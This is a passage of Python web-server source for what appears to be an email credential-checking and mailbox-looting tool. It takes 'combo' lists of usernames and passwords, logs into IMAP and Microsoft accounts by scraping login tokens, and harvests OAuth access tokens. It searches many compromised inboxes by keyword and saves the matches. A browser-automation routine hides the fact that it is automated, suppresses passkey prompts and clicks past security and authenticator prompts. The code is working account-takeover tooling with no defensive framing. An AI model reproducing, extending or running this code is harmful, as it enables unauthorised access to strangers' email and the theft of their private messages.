                        try: imap_conn.starttls(ssl_context=ctx)
                        except: pass
                    
                    with imap_conn:
                        m = typing.cast(Union[imaplib.IMAP4_SSL, imaplib.IMAP4], imap_conn) if 'typing' in globals() else imap_conn
                        m.login(user, pwd)
                        m.select("INBOX", readonly=True)
                        search_q = f'OR SUBJECT "{keyword}" BODY "{keyword}"'
                        _, data = m.search(None, search_q)
                        msg_ids = data[0].split()
                        
                        if msg_ids:
                            for mid_b in reversed(msg_ids[-5:]): # Check last 5 messages
                                mid = mid_b.decode().strip()
                                if not mid: continue
                                resp, m_data = m.fetch(mid, '(BODY[HEADER.FIELDS (FROM SUBJECT DATE)])') # pyre-ignore
                                if resp == 'OK' and isinstance(m_data, list) and m_data[0]:
                                    raw_msg_data = m_data[0]
                                    if isinstance(raw_msg_data, tuple) and len(raw_msg_data) > 1:
                                        raw_msg = raw_msg_data[1]
                                        if isinstance(raw_msg, bytes):
                                            msg = message_from_bytes(raw_msg)
                                            sub = clean_s(msg.get('Subject', ''))
                                            frm = clean_s(msg.get('From', ''))
                                            dt = str(msg.get('Date', ''))
                                            
                                            # Strict secondary filtering to avoid false positives from server
                                            kw_lower = keyword.lower()
                                            if kw_lower in sub.lower() or kw_lower in frm.lower():
                                                res = {"hit": hit, "id": mid, "folder": "INBOX", "from": frm, "sub": sub, "date": dt}
                                                with state.lock:
                                                    if res not in state.search_results:
                                                        state.search_results.append(res)
                                                        state.search_hits += 1
                                                        # Auto-save to file
                                                        try:
                                                            with open("Discovery_Hits.txt", "a", encoding='utf-8') as f:
                                                                f.write(f"{hit} | KW: {keyword} | Sub: {sub} | Date: {dt}\n")
                                                        except: pass
                except: pass
            finally:
                with state.lock: state.search_count += 1
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            for hit in hits:
                if state.stop_requested: break
                ex.submit(_search_one, hit) # pyre-ignore[53e8a7d7-4a81-411f-b209-21986f5d73a4]
        state.search_running = False

    bt.add_task(run_global_search)
    return {"ok": True}



@app.post("/api/utils/clear-results")
async def clear_results_api():
    with state.lock:
        state.checked = 0; state.valid = 0; state.bad = 0; state.hits = 0
        state.live_hits = []; state.search_results = []
        state.search_count = 0; state.search_hits = 0
        state.smtp_checked = 0; state.smtp_live = 0; state.smtp_bad = 0
        state.smtp_results = []; state.outlook_checked = 0; state.outlook_hits = 0
        state.outlook_custom = 0; state.outlook_results = []
        state.disc_done = 0; state.disc_found = 0
    return {"ok": True}

@app.get("/api/history")
async def api_get_history():
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM hits_history ORDER BY rowid DESC LIMIT 500")
            return [dict(r) for r in cursor.fetchall()]
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/clear-database")
async def api_clear_database():
    try:
        with sqlite3.connect(DB_PATH) as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM hits_history")
            conn.commit()
            return {"ok": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/manual/login")
async def api_manual_login(req: Request):
    try:
        d = await req.json()
        combo = d.get('combo')
        user, pwd = get_user_pass(combo)
        if not user or not pwd:
            return {"error": "Invalid Combo Format"}
        
        domain = user.split('@')[-1].lower()
        is_ms = any(x in domain for x in ["outlook", "hotmail", "live", "msn.com"])
        
        if is_ms:
            auth_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={user}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&mkt=en&response_type=code&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
            headers = {
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Thunderbird/115.0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "sec-fetch-site": "none",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            sess = requests.Session()
            r1 = sess.get(auth_url, headers=headers, timeout=20)
            
            ppft = ""
            m = re.search(r'name="PPFT".*?value="([^"]+)"', r1.text)
            if not m: m = re.search(r'name=\\"PPFT\\".*?value=\\"([^\\"]+)\\"', r1.text)
            if m: ppft = m.group(1)
            
            post_url = ""
            pu = re.search(r'"urlPost":"([^"]+)"', r1.text)
            if not pu: pu = re.search(r'urlPost:\\"([^\\"]+)\\"', r1.text)
            if pu: post_url = pu.group(1).replace("\\", "")
            
            if not ppft or not post_url:
                return {"error": "Microsoft Auth Initialization Blocked"}
                
            payload = f"i13=1&login={user}&loginfmt={user}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
            headers_post = headers.copy()
            headers_post.update({
                "Host": "login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(payload)),
                "Origin": "https://login.live.com",
                "Referer": r1.url,
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0"
            })
            
            r2 = sess.post(post_url, data=payload, headers=headers_post, allow_redirects=False, timeout=20)
            location = r2.headers.get('Location', '')
            
            if "code=" in location or "JSH" in str(sess.cookies.get_dict()) or "JSHP" in str(sess.cookies.get_dict()) or "Consent/Update" in r2.text or "oauth20_desktop.srf" in location:
                on_success(user, pwd, "login.live.com", "WEBAuth")
                
                code = ""
                code_match = re.search(r'code=([^&]+)', location)
                if code_match:
                    code = code_match.group(1)
                else:
                    if "/cancel?mkt" in r2.text:
                        try:
                            opt = re.search(r'opidt%3d([^"]+)"', r2.text).group(1)
                            op = re.search(r'opid%3d([^%]+)%26', r2.text).group(1)
                            uaid = re.search(r'ame="uaid" id="uaid" value="([^"]+)"', r2.text).group(1)
                            hop_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&opid={op}&mkt=EN-US&opidt={opt}&res=success&route=C105_BAY"
                            r_hop = sess.get(hop_url, headers=headers_post, allow_redirects=False)
                            location = r_hop.headers.get('Location', '')
                            code_match = re.search(r'code=([^&]+)', location)
                            if code_match: code = code_match.group(1)
                        except: pass
                
                if code:
                    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
                    token_payload = f"client_info=1&client_id=9e5f94bc-e8a4-4e73-b8be-63364c29d753&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FIMAP.AccessAsUser.All%20https%3A%2F%2Foutlook.office.com%2FSMTP.Send"
                    r_token = sess.post(token_url, data=token_payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=20)
                    auth_token = r_token.json().get('access_token')
                    if auth_token:
                        cid = sess.cookies.get('MSPCID', '').upper()
                        with state.lock:
                            state.oauth_tokens[user] = {"token": auth_token, "cid": cid}
                
                return {"ok": True}
            elif "TwoFactor" in r2.text or "Challenge" in r2.text or "Sms" in r2.text or "App" in r2.text:
                return {"error": "Two-Factor Verification Required"}
            else:
                return {"error": "Invalid Credentials"}
        
        else:
            ih, ip, _, _ , _, _ = discover_server(domain)
            try:
                if ip == 993:
                    m = imaplib.IMAP4_SSL(ih, ip, timeout=20, ssl_context=ctx)
                else:
                    m = imaplib.IMAP4(ih, ip, timeout=20)
                    try: m.starttls(ssl_context=ctx)
                    except: pass
                with m:
                    m.login(user, pwd)
                    on_success(user, pwd, ih, "IMAP")
                return {"ok": True}
            except Exception as ex:
                return {"error": f"Connection Failure: {str(ex)}"}
    except Exception as e:
        return {"error": str(e)}
    
@app.get("/api/outlook/autologin")
async def outlook_autologin(u: str, p: str):
    """Bridge endpoint to facilitate one-click autologin to Outlook/Hotmail"""

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }

    # Try the current live.com login flow first
    LOGIN_URLS = [
        "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&CBCXT=out&cobrandid=90015",
        "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841",
    ]

    ppft = ""
    post_url = ""
    session = requests.Session()

    try:
        for auth_url in LOGIN_URLS:
            try:
                r = session.get(auth_url, headers=headers, timeout=15, allow_redirects=True)
                # Try multiple PPFT patterns used by different versions of the Microsoft login page
                for pattern in [
                    r'name="PPFT"\s+id="[^"]*"\s+value="([^"]+)"',
                    r'name="PPFT"\s+value="([^"]+)"',
                    r'"sFT":"([^"]+)"',
                    r'value="([^"]+)"\s+name="PPFT"',
                ]:
                    m = re.search(pattern, r.text)
                    if m:
                        ppft = m.group(1)
                        break

                # Try multiple urlPost patterns
                for pattern in [
                    r'"urlPost":"([^"]+)"',
                    r"'urlPost':'([^']+)'",
                    r'action="(https://login\.live\.com/ppsecure/[^"]+)"',
                ]:
                    pu = re.search(pattern, r.text)
                    if pu:
                        post_url = pu.group(1).replace("\\", "")
                        break

                if ppft and post_url:
                    break
            except Exception:
                continue

        if ppft and post_url:
            # We have everything — build a self-submitting form
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Connecting to Outlook...</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background: #0078d4; color: #fff;
               display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .box {{ text-align: center; }}
        .spinner {{ width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
                   border-top: 4px solid #fff; border-radius: 50%;
                   animation: spin 0.8s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body onload="document.forms[0].submit()">
    <form method="POST" action="{post_url}">
        <input type="hidden" name="login"        value="{u}">
        <input type="hidden" name="loginfmt"     value="{u}">
        <input type="hidden" name="passwd"       value="{p}">
        <input type="hidden" name="PPFT"         value="{ppft}">
        <input type="hidden" name="ppsx"         value="Passport">
        <input type="hidden" name="type"         value="11">
        <input type="hidden" name="LoginOptions" value="3">
        <input type="hidden" name="ps"           value="2">
    </form>
    <div class="box">
        <div class="spinner"></div>
        <h2>🔐 Authenticating {u}…</h2>
        <p>Redirecting to Outlook inbox. Please wait.</p>
    </div>
</body>
</html>"""
            return HTMLResponse(content=html)

        # Fallback — Microsoft blocked token extraction (bot detection / geo-block).
        # Open the real Outlook login page with the email pre-filled via a redirect.
        encoded_email = urllib.parse.quote(u, safe='')
        encoded_pass  = urllib.parse.quote(p, safe='')
        fallback_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Manual Login Required</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee;
               display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 16px;
               padding: 40px; max-width: 480px; text-align: center; }}
        .cred {{ background: #0a0a1a; border: 1px solid #333; border-radius: 8px;
                padding: 12px 18px; font-family: monospace; font-size: 1rem;
                color: #00ffa3; margin: 8px 0; cursor: pointer; }}
        .btn {{ display: inline-block; margin-top: 20px; padding: 12px 28px;
               background: #0078d4; color: #fff; border-radius: 8px; text-decoration: none;
               font-weight: 700; font-size: 1rem; }}
        h2 {{ color: #f0c040; }}
        p  {{ color: #aaa; font-size: 0.9rem; }}
        small {{ color: #555; font-size: 0.75rem; }}
    </style>
</head>
<body>
    <div class="box">
        <h2>⚠️ Auto-login Unavailable</h2>
        <p>Microsoft's login page returned an unexpected response (bot-detection or region block).<br>
           Copy the credentials below and paste them manually.</p>
        <div class="cred" onclick="navigator.clipboard.writeText('{u}').then(()=>this.style.color='#fff')" title="Click to copy">📧 {u}</div>
        <div class="cred" onclick="navigator.clipboard.writeText('{p}').then(()=>this.style.color='#fff')" title="Click to copy">🔑 {p}</div>
        <a class="btn" href="https://outlook.live.com/owa/" target="_blank">🚀 Open Outlook Login</a>
        <a class="btn" href="/api/outlook/browser-login?u={encoded_email}&p={encoded_pass}" style="background: #28a745; margin-left: 10px;">🤖 Launch Browser Login</a>
        <br><br>
        <small>Click a credential box to copy it to clipboard.</small>
    </div>
</body>
</html>"""
        return HTMLResponse(content=fallback_html)

    except Exception as e:
        return HTMLResponse(f"<h2>Bridge Error: {str(e)}</h2>")

@app.get("/api/outlook/browser-login")
async def outlook_browser_login(u: str, p: str):
    """Launches a real browser to perform Outlook login and open the inbox directly."""
    if async_playwright is None:
        return HTMLResponse("<h2>Error: Playwright not installed. Run 'pip install playwright playwright-stealth' and 'playwright install chromium'</h2>")

    async def _run_browser():
        try:
            p_api = await async_playwright().start()
            browser = await p_api.chromium.launch(
                headless=False,
                args=[
                    '--start-maximized',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-features=WebAuthentication,WebAuthenticationVirtualAuthenticator',
                    '--no-sandbox'
                ]
            )
            context = await browser.new_context(
                no_viewport=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            )
            # Prevent Windows Security WebAuthn / Passkey popup from opening
            await context.add_init_script("""
                if (window.navigator && window.navigator.credentials) {
                    window.navigator.credentials.get = function(options) {
                        return Promise.reject(new DOMException("User canceled", "NotAllowedError"));
                    };
                    window.navigator.credentials.create = function(options) {
                        return Promise.reject(new DOMException("User canceled", "NotAllowedError"));
                    };
                }
            """)
            page = await context.new_page()
            if Stealth:
                await Stealth().apply_stealth_async(page)

            print(f"[*] Starting direct Outlook inbox browser login for {u}...")
            login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=160&rver=7.5.2156.0&wp=MBI_SSL&wreply=https%3A%2F%2Foutlook.live.com%2Fowa%2F%3Fnpl%3D1&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2Cflname%2Cwld&cobrandid=90015"
            await page.goto(login_url, wait_until="domcontentloaded", timeout=35000)

            # Step 1: Fill Email
            email_selectors = ['input[name="loginfmt"]', 'input[type="email"]', '#i0116', 'input[name="login"]']
            email_field = None
            for sel in email_selectors:
                try:
                    email_field = await page.wait_for_selector(sel, timeout=7000, state="visible")
                    if email_field:
                        break
                except Exception:
                    continue

            if email_field:
                await email_field.fill(u)
                await asyncio.sleep(0.5)
                # Click Next
                btn_selectors = ['input[id="idSIButton9"]', 'input[type="submit"]', '#idSIButton9', 'button[type="submit"]', '.btn-primary']
                for sel in btn_selectors:
                    try:
                        btn = await page.wait_for_selector(sel, timeout=3000, state="visible")
                        if btn:
                            await btn.click()
                            break
                    except Exception:
                        continue
            else:
                print(f"[!] Email field not found, continuing...")

            # Step 2: Fill Password (with automatic handling for Passkey/FIDO cancellation and "Utilisez votre mot de passe")
            pass_selectors = ['input[name="passwd"]', 'input[type="password"]', '#i0118']
            pass_field = None

            for _ in range(20):
                # Check if password field is visible
                for sel in pass_selectors:
                    try:
                        pass_field = await page.wait_for_selector(sel, timeout=800, state="visible")
                        if pass_field:
                            break
                    except Exception:
                        continue
                if pass_field:
                    break

                # 2a. If stuck on FIDO / Passkey screen, press Escape and click Annuler/Cancel
                try:
                    await page.keyboard.press("Escape")
                except Exception:
                    pass

                try:
                    cancel_btn = await page.wait_for_selector(
                        '#idBtn_Back, a:has-text("Annuler"), button:has-text("Annuler"), a:has-text("Cancel"), button:has-text("Cancel")',
                        timeout=500, state="visible"
                    )
                    if cancel_btn:
                        await cancel_btn.click()
                        print("[*] Dismissed Passkey / FIDO dialog.")
                        await asyncio.sleep(0.6)
                except Exception:
                    pass

                # 2b. Check if Microsoft is showing "Connectez-vous autrement" / "Sign in another way" link
                try:
                    another_way = await page.wait_for_selector(
                        '#signInAnotherWay, a#signInAnotherWay, button#signInAnotherWay, #idA_PWD_SwitchToPassword, a#idA_PWD_SwitchToPassword, '
                        'a:has-text("Connectez-vous autrement"), a:has-text("Sign in another way"), '
                        'a:has-text("Other ways to sign in"), a:has-text("Autre méthode"), a:has-text("Otras formas de iniciar sesión")',
                        timeout=800, state="visible"
                    )
                    if another_way:
                        await another_way.click()
                        print("[*] Clicked 'Connectez-vous autrement' / 'Sign in another way'.")
                        await asyncio.sleep(0.6)
                except Exception:
                    pass

                # 2c. Check if the "Utilisez votre mot de passe" / "Use your password" option tile is present
                pwd_option_selectors = [
                    'div[data-value="Password"]',
                    'div[data-test-id="Password"]',
                    'div[role="button"][data-value="Password"]',
                    '#idA_PWD_SwitchToPassword',
                    'a#idA_PWD_SwitchToPassword',
                    'div:has-text("Utilisez votre mot de passe")',
                    'div:has-text("Utilisez un mot de passe")',
                    'span:has-text("Utilisez votre mot de passe")',
                    'div:has-text("Use your password")',
                    'div:has-text("Use password")',
                    'span:has-text("Use your password")',
                    'div:has-text("Usar su contraseña")',
                    'div:has-text("Kennwort verwenden")',
                    'div[role="button"]:has-text("mot de passe")',
                    'div[role="button"]:has-text("password")',
                    'div[role="button"]:has-text("Password")',
                    'a:has-text("Utilisez votre mot de passe")',
                    'a:has-text("Use your password")',
                    'button:has-text("Utilisez votre mot de passe")',
                    'button:has-text("Use your password")'
                ]
                for p_sel in pwd_option_selectors:
                    try:
                        p_opt = await page.wait_for_selector(p_sel, timeout=800, state="visible")
                        if p_opt:
                            await p_opt.click()
                            print("[*] Clicked 'Utilisez votre mot de passe' / 'Use your password' option.")
                            await asyncio.sleep(0.8)
                            break
                    except Exception:
                        continue

                await asyncio.sleep(0.5)

            if pass_field:
                await pass_field.fill(p)
                await asyncio.sleep(0.5)
                # Click Sign In or press Enter
                btn_selectors = ['input[id="idSIButton9"]', 'input[type="submit"]', '#idSIButton9', 'button[type="submit"]', '.btn-primary']
                clicked = False
                for sel in btn_selectors:
                    try:
                        btn = await page.wait_for_selector(sel, timeout=3000, state="visible")
                        if btn:
                            await btn.click()
                            clicked = True
                            break
                    except Exception:
                        continue
                if not clicked:
                    try:
                        await pass_field.press("Enter")
                    except Exception:
                        pass
                print(f"[*] Password submitted for {u}.")
            else:
                print(f"[!] Password field not found after checking options.")

            # Step 3: Handle intermediate prompts (KMSI / Stay Signed In / Authenticator app skip / Security notices)
            for _ in range(12):
                await asyncio.sleep(1.0)
                cur_url = page.url.lower()
                if "outlook.live.com/mail" in cur_url or "outlook.office.com/mail" in cur_url or "outlook.office365.com/mail" in cur_url:
                    break

                # 3a. Stay signed in? prompt (Yes)
                try:
                    stay_btn = await page.wait_for_selector('#idSIButton9, input[id="idSIButton9"], input[value="Yes"], button[id="idSIButton9"], #acceptButton', timeout=1500, state="visible")
                    if stay_btn:
                        await stay_btn.click()
                        print("[*] Handled 'Stay signed in' prompt.")
                        continue
                except Exception:
                    pass

                # 3b. Break free from passwords / Authenticator / Skip for now
                try:
                    skip_btn = await page.wait_for_selector('#iCancel, #iShowSkip, a:has-text("No thanks"), button:has-text("No thanks"), a:has-text("Skip for now"), a:has-text("Not now"), a:has-text("Later"), a:has-text("Remind me later")', timeout=1500, state="visible")
                    if skip_btn:
                        await skip_btn.click()
                        print("[*] Handled Authenticator / Skip prompt.")
                        continue
                except Exception:
                    pass

                # 3c. Looks good / Continue / Accept
                try:
                    ok_btn = await page.wait_for_selector('#iLooksGood, a[id="iLooksGood"], button:has-text("Looks good"), button:has-text("Continue"), button:has-text("Accept")', timeout=1500, state="visible")
                    if ok_btn:
                        await ok_btn.click()
                        print("[*] Handled Security / Confirmation prompt.")
                        continue
                except Exception:
                    pass

            # Step 4: Ensure navigation directly to the Outlook Inbox
            await asyncio.sleep(2.0)
            cur_url = page.url.lower()
            if not ("outlook.live.com/mail" in cur_url or "outlook.office.com/mail" in cur_url or "outlook.office365.com/mail" in cur_url):
                print(f"[*] Redirecting explicitly to Outlook inbox for {u}...")
                try:
                    await page.goto("https://outlook.live.com/mail/0/inbox", wait_until="domcontentloaded", timeout=25000)
                except Exception:
                    pass

            try:
                await page.bring_to_front()
            except Exception:
                pass

            print(f"[✓] Outlook inbox session open and ready for {u}!")

            # Keep browser alive until user closes the window
            while browser.is_connected() and len(context.pages) > 0:
                await asyncio.sleep(2)
        except Exception as e:
            print(f"Browser login error for {u}: {e}")
        finally:
            try:
                if 'browser' in locals() and browser.is_connected():
                    await browser.close()
            except Exception:
                pass
            try:
                if 'p_api' in locals():
                    await p_api.stop()
            except Exception:
                pass

    # Start browser session in background
    asyncio.create_task(_run_browser())

    return HTMLResponse(f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Opening Outlook Inbox...</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; background: #0b132b; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .box {{ background: #1c2541; padding: 32px 40px; border-radius: 16px; text-align: center; border: 1px solid #48cae4; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 480px; }}
        .spinner {{ width: 44px; height: 44px; border: 4px solid rgba(72,202,228,0.2); border-top: 4px solid #48cae4; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 16px auto; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        h2 {{ color: #48cae4; margin: 10px 0; }}
        p {{ color: #cbd5e1; font-size: 0.95rem; line-height: 1.5; }}
        .btn {{ background: #0078d4; color: white; border: none; border-radius: 8px; padding: 10px 24px; font-weight: 600; cursor: pointer; margin-top: 15px; }}
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <h2>🚀 Opening Outlook Inbox</h2>
        <p>A Chromium browser has been launched and is logging directly into the Outlook inbox for:<br/><b style="color:#00ffa3;">{u}</b></p>
        <p style="font-size:0.8rem; color:#94a3b8;">Switch to the newly opened Chromium window to view your inbox. This tab will close automatically.</p>
        <button class="btn" onclick="window.close()">Close Tab</button>
    </div>
    <script>
        setTimeout(function(){{ window.close(); }}, 3500);
    </script>
</body>
</html>""")

@app.get("/api/smtp/hits")
def list_smtp_hits(): return state.smtp_results

@app.get("/api/hits")
def list_hits():
    if os.path.exists(VALID_PATH):
        try:
            res = []
            with open(VALID_PATH,'r',encoding='utf-8') as f:
                for line in f:
                    if '|' in line:
                        parts = line.split(' | ')
                        res.append({"hit": parts[0].strip(), "proto": parts[1].strip()})
                    elif ':' in line:
                        res.append({"hit": line.strip(), "proto": ""})
            return res
        except: return []
    return []

@app.get("/api/mail/folders")
def get_folders(hit: str, srv: str | None = None, port: int | None = None):
    try:
        user, pwd = get_user_pass(hit)
        if not user or not pwd: return []
        
        if srv and port:
            ih, ip = srv, int(port)
        else:
            ih, ip, _, _, _, _ = discover_server(user.split('@')[-1])
            
        imap_conn: Union[imaplib.IMAP4_SSL, imaplib.IMAP4]
        if ip == 993:
            imap_conn = imaplib.IMAP4_SSL(ih, ip, timeout=15, ssl_context=ctx)
        else:
            imap_conn = imaplib.IMAP4(ih, ip, timeout=15)
            try: imap_conn.starttls(ssl_context=ctx)
            except: pass
            
        with imap_conn:
            m = typing.cast(Union[imaplib.IMAP4_SSL, imaplib.IMAP4], imap_conn) if 'typing' in globals() else imap_conn
            m.login(user,pwd)
            
            # Exhaustive probing for folder listing to support non-standard servers
            fl = None
            for ref in ["", '""', "/", "INBOX"]:
                for pat in ["*", "%", "INBOX*", "*INBOX*"]:
                    try:
                        status, response = m.list(ref, pat) # pyre-ignore
                        if status == 'OK' and response and response[0] is not None:
                            fl = response; break
                    except: continue
                if fl: break
            
            if not fl:
                # If everything else fails, try LSUB or a simple INBOX check
                try: status, fl = m.lsub("", "*"); # pyre-ignore
                except: fl = None
                
            if not fl:
                # Absolute last resort: Hardcode common folders if listing is completely blocked
                # This ensures the viewer still works even if the server is very strict
                return [{"name": "INBOX", "count": "0"}, {"name": "Junk", "count": "0"}, {"name": "Sent", "count": "0"}]
            
            res = []
            for f in fl:
                if not f: continue
                fb = f if isinstance(f, bytes) else bytes(str(f), 'utf-8')
                fs = fb.decode(errors='ignore')
                
                # Improved Regex for folder name extraction (handling quoted and unquoted names)
                match = re.search(r'"([^"]+)"$', fs)
                if not match:
                    match = re.search(r'\s([^\s]+)$', fs)
                
                name = match.group(1) if match else fs.strip().split()[-1]
                name = name.replace('"', '').strip()
                if not name: continue

                # Faster than m.select() - doesn't open the mailbox
                try:
                    status_im, count_data = m.status(f'"{name}"', "(MESSAGES)") # pyre-ignore
                    if status_im == 'OK' and count_data:
                        # count_data is a list of bytes
                        cnt_str = count_data[0].decode(errors='ignore')
                        cnt_match = re.search(r'MESSAGES (\d+)', cnt_str)
                        count = cnt_match.group(1) if cnt_match else "0"
                    else: count = "0"
                except: count = "0"
                res.append({"name": name, "count": count})
            return res
    except Exception as e: return {"error": str(e)}

@app.get("/api/mail/messages")
def get_messages(hit: str, folder: str = "INBOX", page: int = 1, q: str = "", ps: str = "50", srv: str | None = None, port: int | None = None):
    try:
        user, pwd = get_user_pass(hit)
        if not user or not pwd: return {"error": "invalid hit"}
        
        if srv and port:
            ih, ip = srv, int(port)
        else:
            ih, ip, _, _, _, _ = discover_server(user.split('@')[-1])
            
        m = None
        if ip == 993: m = imaplib.IMAP4_SSL(ih, ip, timeout=22, ssl_context=ctx)
        else:
            m = imaplib.IMAP4(ih, ip, timeout=22)
            try: m.starttls(ssl_context=ctx)
            except: pass
        if not m: return {"msgs": [], "total": 0}
        with m:
            mc = typing.cast(Union[imaplib.IMAP4_SSL, imaplib.IMAP4], m) if 'typing' in globals() else m
            mc.login(user,pwd); mc.select(f'"{folder}"', readonly=True)
            search_crit = q if q else 'ALL'
            _, data = mc.search(None, search_crit)
            ids = list(data[0].split()) if (data and data[0]) else []
            ids.reverse()
            
            try:
                page_size = int(ps)
                start_index = (int(page) - 1) * page_size
                end_index = min(start_index + page_size, len(ids))
                # Only collect non-empty IDs
                batch = [ids[i] for i in range(start_index, end_index) if ids[i].strip()] if start_index < len(ids) else []
            except:
                batch = [ids[i] for i in range(0, min(20, len(ids)))]

            
            res = []
            if batch:
                ids_str = ",".join([b.decode(errors='ignore') for b in batch])
                typ, mdata = mc.fetch(ids_str, '(BODY[HEADER.FIELDS (SUBJECT FROM DATE)])') # pyre-ignore
                if typ == 'OK':
                    for item in mdata:
                        if isinstance(item, tuple):
                            mid_match = re.search(r'^\d+', item[0].decode())
                            mid_s = mid_match.group() if mid_match else "0"
                            h = message_from_bytes(item[1] if isinstance(item[1], (bytes, bytearray)) else bytes(str(item[1]), 'utf-8'))
                            res.append({"id":mid_s,"sub":clean_s(h.get('Subject','')),"from":clean_s(h.get('From','')),"date":clean_s(h.get('Date',''))})
            
            # Autosave hits by keyword feature
            if q and q != "ALL" and len(ids) > 0:
                try:
                    kw = q.replace('SUBJECT "', '').replace('"', '').strip() if 'SUBJECT' in q else q
                    if kw:
                        os.makedirs(HITS_FOLDER, exist_ok=True)
                        h_path = os.path.join(HITS_FOLDER, f"{kw.replace(':','_').replace('/','_')}.txt")
                        with open(h_path, 'a', encoding='utf-8') as fh:
                            fh.write(f"[{datetime.datetime.now().strftime('%H:%M')}] FOLDER: {folder} | ACCOUNT: {hit} | HITS: {len(ids)}\n")
                except: pass

            return {"msgs": res, "total": len(ids)}


    except Exception as e: return {"error": str(e)}

@app.get("/api/mail/body")
def get_body(hit: str, folder: str, mid: str, srv: str | None = None, port: int | None = None):
    try:
        user, pwd = get_user_pass(hit)
        if not user or not pwd: return {"error": "invalid hit"}
        
        if srv and port:
            ih, ip = srv, int(port)
        else:
            ih, ip, _, _, _, _ = discover_server(user.split('@')[-1])
            
        def _fetch_msg():
            if ip == 993:
                m_conn = imaplib.IMAP4_SSL(ih, ip, timeout=state.timeout, ssl_context=ctx)
            else:
                m_conn = imaplib.IMAP4(ih, ip, timeout=state.timeout)
                try: m_conn.starttls(ssl_context=ctx)
                except: pass
            
            m_conn.login(user,pwd)
            m_conn.select(f'"{folder}"', readonly=True)
            if not mid or not str(mid).strip(): 
                m_conn.logout()
                raise Exception("Invalid Message ID")
            _, d = m_conn.fetch(mid, '(RFC822)')
            m_conn.logout()
            return d

        d = safe_execute_with_retry(_fetch_msg)
        if not d or not d[0] or d[0] is None: return {"error": "Empty message data"}
        d0 = d[0]; raw = d0[1] if isinstance(d0, tuple) else d0
        msg = message_from_bytes(raw if isinstance(raw, (bytes, bytearray)) else bytes(str(raw), 'utf-8'))
        res = {"text":"","html":"","sub":clean_s(msg.get('Subject')),"from":clean_s(msg.get('From')), "attachments": []}
        
        if msg.is_multipart():
            for prt in msg.walk():
                ct = str(prt.get_content_type()).lower()
                cd = str(prt.get('Content-Disposition'))
                payload = prt.get_payload(decode=True)
                if isinstance(payload, (bytes, bytearray)):
                    if 'attachment' in cd:
